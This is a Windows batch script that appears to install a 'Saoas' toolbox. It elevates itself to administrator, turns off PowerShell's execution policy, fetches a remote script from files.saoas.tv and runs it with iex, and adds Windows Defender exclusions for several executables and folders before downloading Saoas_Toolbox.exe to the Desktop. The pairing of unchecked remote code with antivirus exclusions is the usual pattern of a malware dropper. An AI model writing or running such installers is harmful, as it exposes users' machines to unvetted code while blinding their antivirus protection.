@echo off & setlocal
net session >NUL 2>&1 && goto :ELEVATED
set ELEVATE_CMDLINE=cd /d "%~dp0" ^& "%~f0" %*
powershell.exe -noprofile -c Start-Process -Verb RunAs cmd.exe \"/c $env:ELEVATE_CMDLINE\"
exit /b %ERRORLEVEL%
:ELEVATED

set "psCommand=Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://files.saoas.tv/path.ps1'))"

mkdir "C:\Saoas"

powershell -NoLogo -Sta -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& {%psCommand%}"
powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
powershell -Command Add-MpPreference -ExclusionProcess "Installer.exe" -Force
powershell -Command Add-MpPreference -ExclusionProcess "Multi_Downloader.exe" -Force
powershell -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\Desktop\Saoas_Tools" -Force
powershell -Command Add-MpPreference -ExclusionPath "C:\Saoas" -Force

cd "C:\Saoas"
powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe"

cd /d "%USERPROFILE%\Desktop"
powershell Invoke-WebRequest -Uri "https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe" -OutFile "Saoas_Toolbox.exe"